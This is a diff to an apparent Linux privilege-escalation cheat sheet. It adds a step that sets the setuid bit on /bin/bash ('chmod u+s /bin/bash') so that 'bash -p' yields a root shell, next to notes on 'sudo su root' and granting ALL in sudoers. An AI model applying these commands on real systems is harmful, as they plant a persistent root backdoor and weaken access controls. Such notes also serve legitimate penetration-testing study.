@@ -10,9 +10,14 @@ Superuser Do switch user into Root account
 sudo su root
 ```
 
-/bin/bash root
+/bin/bash privileged mode
 ```
 /bin/bash -p
+```
+
+Change permissions of /bin/bash,  then /bin/bash -p
+```
+chmod u+s /bin/bash
 ```
 
 Append ALL permissions into sudoers file
